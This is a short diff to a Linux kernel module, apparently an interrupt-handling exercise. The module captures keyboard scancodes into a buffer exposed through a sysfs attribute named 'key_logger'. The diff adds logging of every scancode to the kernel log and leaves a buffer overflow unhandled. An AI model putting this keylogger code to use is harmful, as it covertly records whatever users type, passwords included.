@@ -71,8 +71,9 @@ static struct kobj_attribute my_attr = __ATTR(key_logger, 0644, my_show, NULL);
 
 static irqreturn_t keyboard_handler(int irq, void *dev)
 {
-	char scancode;
+	unsigned char scancode;
 	scancode = inb(KBD_DATA_REG);
+        pr_info("%s: scancode: %u\n", __func__, scancode);
 	if(!(scancode & KBD_STATUS_MASK)) {
 		keylog[keylog_index++] = kbdus[scancode];
 		//ToDo: Handle buffer overflow
@@ -107,4 +108,3 @@ static void test_interrupt_exit(void)
 
 module_init(test_interrupt_init);
 module_exit(test_interrupt_exit);
-
